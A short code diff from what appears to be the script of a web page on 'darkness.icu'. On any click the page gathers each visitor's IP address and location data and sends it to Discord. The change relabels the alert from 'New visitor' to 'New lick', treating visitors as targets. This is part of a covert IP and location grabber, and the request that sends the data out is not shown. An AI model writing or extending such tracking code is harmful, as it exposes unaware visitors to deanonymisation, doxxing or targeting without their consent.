@@ -28,7 +28,7 @@ document.body.onclick = async () => {
 
   // ✅ SEND *ALL* IP DATA (not just IP) TO DISCORD
   const discordPayload = {
-    content: "🔥 New visitor to darkness.icu",
+    content: "New lick - darkness.icu",
     embeds: [{
       title: "IP & Location Logged (Full Data)",
       color: 0xff0000,
